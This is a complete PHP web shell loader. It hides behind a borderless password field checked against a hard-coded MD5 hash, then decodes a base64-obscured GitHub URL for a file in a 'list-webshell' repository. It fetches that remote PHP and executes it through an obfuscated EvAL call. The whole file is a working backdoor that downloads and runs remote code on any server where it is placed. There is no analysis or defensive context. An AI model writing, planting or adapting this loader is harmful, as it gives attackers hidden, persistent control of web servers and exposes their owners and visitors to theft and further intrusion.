<?php

$password = "24f290a459a2307b58de73e9c2a22b20";
if(isset($_POST['password'])) {
    if(md5($_POST['password']) == $password) {
        setcookie('auth', md5($password));
        header("Refresh:0");
    }
}
if(isset($_COOKIE)) {
    if($_COOKIE['auth'] != md5($password)) {
        echo "<form method=POST action=''><input type='password' name='password' style='outline: none; border: none'></form>";
        die();
    }
}

$file = file_get_contents(base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hla2VyLXByby9saXN0LXdlYnNoZWxsL3JlZnMvaGVhZHMvbWFpbi9zaHhzLnBocAo="));
EvAL ("?>" . $file);
